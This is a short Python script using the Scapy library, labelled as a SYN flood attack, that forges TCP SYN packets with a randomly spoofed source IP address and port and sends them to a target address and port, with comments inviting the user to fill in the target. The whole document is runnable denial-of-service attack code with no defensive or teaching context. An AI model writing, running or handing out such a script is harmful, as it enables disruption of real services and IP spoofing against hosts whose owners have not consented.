from scapy.all import *
import random

def syn_flood(target_ip, target_port):
    # Generate a random source IP address
    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    
    # Generate a random source port
    src_port = random.randint(1024, 65535)
    
    # Create a SYN packet
    ip = IP(src=src_ip, dst=target_ip)
    tcp = TCP(sport=src_port, dport=target_port, flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    
    # Send the packet in a loop
    for i in range(30):
        send(p, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.7"  # Replace with target IP
    target_port = 80  # Replace with target port
    
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    syn_flood(target_ip, target_port)